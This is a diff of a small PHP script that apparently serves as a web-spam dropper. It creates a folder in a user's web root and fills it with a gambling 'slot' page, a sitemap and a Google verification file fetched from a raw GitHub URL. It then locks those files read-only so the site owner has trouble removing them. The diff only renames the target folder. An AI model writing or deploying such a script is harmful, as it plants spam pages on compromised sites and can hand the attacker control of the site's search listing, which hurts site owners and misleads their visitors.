@@ -1,16 +1,16 @@
 <?php
-$doc = '/home/celinagouj/www/bintang/';
-$doc1 = '/home/celinagouj/www/bintang/index.html';
-$doc2 = '/home/celinagouj/www/bintang/sitemap.xml';
-$doc3 = '/home/celinagouj/www/bintang/googleac434a374d6877e5.html';
+$doc = '/home/celinagouj/www/bintang88/';
+$doc1 = '/home/celinagouj/www/bintang88/index.html';
+$doc2 = '/home/celinagouj/www/bintang88/sitemap.xml';
+$doc3 = '/home/celinagouj/www/bintang88/googleac434a374d6877e5.html';
 
 
 
 // echo $doc
 mkdir($doc);
-file_put_contents("/home/celinagouj/www/bintang/index.html",file_get_contents('https://raw.githubusercontent.com/kaizenslt/bintang/main/slot.txt'));
-file_put_contents("/home/celinagouj/www/bintang/sitemap.xml",file_get_contents('https://raw.githubusercontent.com/kaizenslt/bintang/main/sitemap.txt'));
-file_put_contents("/home/celinagouj/www/bintang/googleac434a374d6877e5.html",file_get_contents('https://raw.githubusercontent.com/kaizenslt/bintang/main/gugel.txt'));
+file_put_contents("/home/celinagouj/www/bintang88/index.html",file_get_contents('https://raw.githubusercontent.com/kaizenslt/bintang/main/slot.txt'));
+file_put_contents("/home/celinagouj/www/bintang88/sitemap.xml",file_get_contents('https://raw.githubusercontent.com/kaizenslt/bintang/main/sitemap.txt'));
+file_put_contents("/home/celinagouj/www/bintang88/googleac434a374d6877e5.html",file_get_contents('https://raw.githubusercontent.com/kaizenslt/bintang/main/gugel.txt'));
 chmod($doc1,0444);
 chmod($doc2,0444);
 chmod($doc3,044);
